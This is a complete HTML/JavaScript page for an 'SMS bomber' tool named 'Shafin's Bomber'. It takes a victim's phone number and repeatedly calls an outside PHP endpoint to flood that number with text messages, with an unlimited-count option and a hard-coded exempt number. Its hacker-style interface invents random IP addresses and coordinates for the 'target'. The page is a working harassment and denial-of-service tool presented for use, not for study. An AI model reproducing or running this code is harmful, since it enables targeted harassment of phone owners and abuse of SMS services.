<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
  <meta name="theme-color" content="#000000">
  <title>SHAFIN'S BOMBER V3.16.7 MOBILE</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">

  <style>
    :root {
      --primary: #00ff41;
      --dim: #008F11;
      --alert: #ff3333;
      --bg: #050505;
      --panel: rgba(0, 10, 0, 0.85);
      --glass: blur(4px);
    }

    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--primary);
      font-family: "Share Tech Mono", monospace;
      height: 100dvh;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    /* Matrix Background */
    canvas#matrix {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: -1;
      opacity: 0.15;
    }

    /* Main Container */
    .app-container {
      flex: 1;
      display: flex;
      flex-direction: column;
      max-width: 600px;
      margin: 0 auto;
      width: 100%;
      background: var(--panel);
      backdrop-filter: var(--glass);
      -webkit-backdrop-filter: var(--glass);
      border-left: 1px solid #003300;
      border-right: 1px solid #003300;
      box-shadow: 0 0 20px rgba(0,255,65,0.1);
    }

    /* Header */
    .header {
      padding: 15px;
      background: rgba(0, 20, 0, 0.9);
      border-bottom: 1px solid var(--dim);
      text-align: center;
      flex-shrink: 0;
    }
    .title {
      font-size: 1.2rem;
      letter-spacing: 2px;
      text-shadow: 0 0 5px var(--primary);
      margin: 0;
    }
    .status {
      font-size: 0.7rem;
      color: var(--dim);
      margin-top: 5px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 5px;
    }
    .status span { color: var(--alert); animation: blink 1s infinite; }

    /* Scrollable Content */
    .content-scroll {
      flex: 1;
      overflow-y: auto;
      padding: 15px;
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    /* Radar Section */
    .visuals {
      position: relative;
      height: 160px;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      border: 1px dashed var(--dim);
      background: rgba(0,0,0,0.3);
      border-radius: 4px;
      flex-shrink: 0;
    }
    canvas#radar { width: 160px; height: 160px; }
    .geo-overlay {
      position: absolute;
      bottom: 5px; right: 5px;
      font-size: 0.65rem;
      color: var(--dim);
      text-align: right;
    }

    /* Controls */
    .controls { display: flex; flex-direction: column; gap: 15px; }
    
    .input-group { position: relative; }
    .input-group label {
      position: absolute;
      top: -8px; left: 10px;
      background: #000;
      padding: 0 5px;
      font-size: 0.75rem;
      color: var(--dim);
    }
    
    input {
      width: 100%;
      background: rgba(0, 20, 0, 0.5);
      border: 1px solid var(--dim);
      color: var(--primary);
      padding: 15px;
      font-family: inherit;
      font-size: 1.1rem;
      border-radius: 4px;
      transition: 0.3s;
    }
    input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 10px rgba(0,255,65,0.2);
      background: rgba(0, 30, 0, 0.8);
    }
    input::placeholder { color: #004400; }

    /* Buttons */
    .btn-row { display: flex; gap: 10px; margin-top: 5px; }
    
    button {
      flex: 1;
      padding: 18px;
      font-family: inherit;
      font-weight: bold;
      font-size: 1rem;
      text-transform: uppercase;
      cursor: pointer;
      border: none;
      border-radius: 2px;
      position: relative;
      overflow: hidden;
    }

    .btn-start {
      background: var(--primary);
      color: #000;
      box-shadow: 0 0 15px rgba(0,255,65,0.3);
    }
    .btn-start:active { transform: scale(0.97); }
    .btn-start:disabled { background: #1a4d1a; color: #000; opacity: 0.7; }

    .btn-stop {
      background: transparent;
      border: 1px solid var(--alert);
      color: var(--alert);
    }
    .btn-stop:active { background: var(--alert); color: #000; }

    /* Terminal Footer */
    .terminal {
      height: 120px;
      background: #000;
      border-top: 1px solid var(--dim);
      padding: 10px;
      font-size: 0.75rem;
      overflow-y: auto;
      flex-shrink: 0;
      font-family: monospace;
    }
    .log-line { margin-bottom: 3px; border-left: 2px solid transparent; padding-left: 5px; }
    .log-sys { color: #ffff00; border-color: #ffff00; }
    .log-sent { color: #aaffaa; border-color: var(--primary); }
    .log-err { color: var(--alert); border-color: var(--alert); }

    /* Stats Display */
    .stats-bar {
        display: flex;
        justify-content: space-between;
        background: #001100;
        padding: 5px 10px;
        font-size: 0.8rem;
        border: 1px solid var(--dim);
        margin-bottom: 5px;
    }
    .stat-box span { color: #fff; font-weight: bold; }

    @keyframes blink { 50% { opacity: 0; } }
    
    /* Fix for small phones */
    @media (max-height: 600px) {
      .visuals { height: 100px; }
      canvas#radar { width: 100px; height: 100px; }
      .terminal { height: 80px; }
      .header { padding: 10px; }
    }
  </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="app-container">
  <div class="header">
    <h1 class="title" id="typewriter"></h1>
    <div class="status"><span>●</span> ENCRYPTED CONNECTION</div>
  </div>

  <div class="content-scroll">
    <!-- Radar Visualization -->
    <div class="visuals">
      <canvas id="radar" width="200" height="200"></canvas>
      <div class="geo-overlay" id="geo-info">
        TARGET: UNKNOWN<br>
        LOCATING...
      </div>
    </div>

    <!-- Stats Bar -->
    <div class="stats-bar">
        <div class="stat-box">SENT: <span id="sentCount">0</span></div>
        <div class="stat-box">LIMIT: <span id="limitCount">∞</span></div>
    </div>

    <!-- Inputs -->
    <div class="controls">
      <div class="input-group">
        <label>TARGET NUMBER (11 DIGIT)</label>
        <input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="017XXXXXXXX" maxlength="11" />
      </div>

      <div class="input-group">
        <label>AMOUNT (OPTIONAL)</label>
        <input id="amount" type="number" inputmode="numeric" placeholder="Unlimited" />
      </div>

      <div class="input-group">
        <label>DELAY (MS)</label>
        <input id="speed" type="number" inputmode="numeric" value="1500" placeholder="1000" />
      </div>

      <div class="btn-row">
        <button id="startBtn" class="btn-start">INITIATE</button>
        <button id="stopBtn" class="btn-stop">ABORT</button>
      </div>
    </div>
  </div>

  <!-- Console Log -->
  <div class="terminal" id="console">
    <div class="log-line log-sys">> SYSTEM READY. WAITING FOR INPUT...</div>
  </div>
</div>

<script>
// --- CONFIGURATION ---
let isRunning = false;
let attackTimer = null;
let packetsSent = 0;
let packetLimit = 0;
const PROTECTED_NUMS = ["01317087493"]; 

// --- DOM ELEMENTS ---
const ui = {
  phone: document.getElementById('phone'),
  amount: document.getElementById('amount'),
  speed: document.getElementById('speed'),
  console: document.getElementById('console'),
  startBtn: document.getElementById('startBtn'),
  stopBtn: document.getElementById('stopBtn'),
  geoInfo: document.getElementById('geo-info'),
  title: document.getElementById('typewriter'),
  sentDisplay: document.getElementById('sentCount'),
  limitDisplay: document.getElementById('limitCount')
};

// --- INITIALIZATION ---
window.addEventListener('DOMContentLoaded', () => {
  const savedPhone = localStorage.getItem('shafin_target');
  if(savedPhone) {
    ui.phone.value = savedPhone;
    log(`Restored Session: ${savedPhone}`, 'sys');
  }
  typewriterEffect("SHAFIN'S BOMBER V3.16.7");
  resizeMatrix();
  animateRadar();
  matrixLoop();
});

window.addEventListener('resize', resizeMatrix);

// --- UTILITIES ---
function log(msg, type = 'sent') {
  const div = document.createElement('div');
  const time = new Date().toLocaleTimeString('en-US', {hour12:false, hour:"numeric", minute:"numeric", second:"numeric"});
  div.className = `log-line log-${type}`;
  div.innerHTML = `[${time}] ${msg}`;
  ui.console.appendChild(div);
  ui.console.scrollTop = ui.console.scrollHeight;
  
  if(ui.console.childElementCount > 50) ui.console.removeChild(ui.console.firstChild);
}

function typewriterEffect(text, i = 0) {
  if (i < text.length) {
    ui.title.innerHTML += text.charAt(i);
    setTimeout(() => typewriterEffect(text, i + 1), 50);
  }
}

function vibrate(pattern) {
  if (navigator.vibrate) navigator.vibrate(pattern);
}

// --- ATTACK LOGIC ---
ui.startBtn.addEventListener('click', () => {
  let phone = ui.phone.value.replace(/[^0-9]/g, '');
  const speed = parseInt(ui.speed.value) || 1500;
  packetLimit = parseInt(ui.amount.value) || 0; // 0 means unlimited

  // Security Checks
  if (PROTECTED_NUMS.includes(phone)) {
    log('ACCESS DENIED: SHAFIN PROTOCOL', 'err');
    vibrate([50, 50, 50, 50, 200]);
    alert("SYSTEM WARNING: Target is protected.");
    return;
  }

  if(phone.length < 11) {
    log('ERROR: INVALID MSISDN LENGTH', 'err');
    vibrate(200);
    return;
  }

  // Save State
  localStorage.setItem('shafin_target', phone);

  // UI Update
  isRunning = true;
  packetsSent = 0;
  ui.sentDisplay.innerText = "0";
  ui.limitDisplay.innerText = packetLimit > 0 ? packetLimit : "∞";
  
  ui.startBtn.disabled = true;
  ui.startBtn.innerText = "ATTACKING...";
  ui.phone.disabled = true;
  log(`TARGET LOCKED: ${phone}`, 'sys');
  vibrate(100);

  // Attack Loop
  attackTimer = setInterval(() => {
    if(!isRunning) return;
    
    // Check limit
    if(packetLimit > 0 && packetsSent >= packetLimit) {
      stopAttack("PACKET LIMIT REACHED");
      return;
    }

    sendPacket(phone);
    updateGeoData();

  }, speed);
});

ui.stopBtn.addEventListener('click', () => {
  if(isRunning) stopAttack("MANUAL ABORT");
});

function stopAttack(reason) {
  isRunning = false;
  clearInterval(attackTimer);
  ui.startBtn.disabled = false;
  ui.startBtn.innerText = "INITIATE";
  ui.phone.disabled = false;
  log(`STOPPED: ${reason}`, 'err');
  vibrate(500);
}

async function sendPacket(phone) {
  const url = `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=1`;
  
  // Try sending request
  try {
    // We initiate the fetch. 
    // Note: Due to 'no-cors', we cannot verify if the server *successfully* sent the SMS (200 OK) or failed (500 Error).
    // However, this code will only increment if the browser successfully *dispatched* the request.
    await fetch(url, { mode: 'no-cors' }); 
    
    // Increment ONLY after the fetch is dispatched
    packetsSent++;
    ui.sentDisplay.innerText = packetsSent;
    log(`>> Request ${packetsSent} sent`);
    
  } catch (e) {
    // If there is a network error (e.g. no internet), we do NOT increment
    log(`Network Fail: ${e.message}`, 'err');
  }
}

// --- VISUALIZATION: RADAR ---
const rCanvas = document.getElementById('radar');
const rCtx = rCanvas.getContext('2d');
let radarAngle = 0;

function animateRadar() {
  const w = rCanvas.width;
  const h = rCanvas.height;
  const cx = w/2, cy = h/2;
  
  rCtx.clearRect(0,0,w,h);
  
  // Static Rings
  rCtx.strokeStyle = 'rgba(0, 50, 0, 0.5)';
  rCtx.lineWidth = 1;
  rCtx.beginPath();
  rCtx.arc(cx, cy, w*0.2, 0, Math.PI*2);
  rCtx.arc(cx, cy, w*0.35, 0, Math.PI*2);
  rCtx.arc(cx, cy, w*0.48, 0, Math.PI*2);
  rCtx.stroke();
  
  // Rotating Sweep
  rCtx.save();
  rCtx.translate(cx, cy);
  rCtx.rotate(radarAngle);
  
  const grad = rCtx.createLinearGradient(0, 0, w*0.5, 0);
  grad.addColorStop(0, 'rgba(0, 255, 65, 0)');
  grad.addColorStop(1, 'rgba(0, 255, 65, 0.5)');
  
  rCtx.fillStyle = grad;
  rCtx.beginPath();
  rCtx.moveTo(0,0);
  rCtx.arc(0, 0, w*0.48, -0.2, 0.2); 
  rCtx.fill();
  rCtx.restore();

  // Random Blips
  if(isRunning && Math.random() > 0.92) {
    const dist = (Math.random() * (w*0.4));
    const ang = Math.random() * Math.PI * 2;
    const x = cx + Math.cos(ang) * dist;
    const y = cy + Math.sin(ang) * dist;
    rCtx.fillStyle = '#ff3333';
    rCtx.fillRect(x, y, 3, 3);
  }

  radarAngle += 0.05;
  requestAnimationFrame(animateRadar);
}

function updateGeoData() {
  const ip = `103.20.${Math.floor(Math.random()*99)}.${Math.floor(Math.random()*255)}`;
  ui.geoInfo.innerHTML = `IP: ${ip}<br>LAT: 23.${Math.floor(Math.random()*999)}<br>LNG: 90.${Math.floor(Math.random()*999)}`;
}

// --- VISUALIZATION: MATRIX ---
const mC = document.getElementById("matrix");
const mCtx = mC.getContext("2d");
let drops = [];
const charSet = "01"; 

function resizeMatrix() {
  mC.height = window.innerHeight;
  mC.width = window.innerWidth;
  drops = Array(Math.floor(mC.width/20)).fill(1);
}

function matrixLoop() {
  mCtx.fillStyle = "rgba(0, 0, 0, 0.1)"; 
  mCtx.fillRect(0, 0, mC.width, mC.height);
  
  mCtx.fillStyle = "#0f3"; 
  mCtx.font = "16px monospace";
  
  drops.forEach((y, i) => {
    const text = charSet[Math.floor(Math.random() * charSet.length)];
    mCtx.fillText(text, i * 20, y * 20);
    
    if (y * 20 > mC.height && Math.random() > 0.98) {
      drops[i] = 0;
    }
    drops[i]++;
  });
  
  requestAnimationFrame(matrixLoop);
}

</script>
</body>
</html>
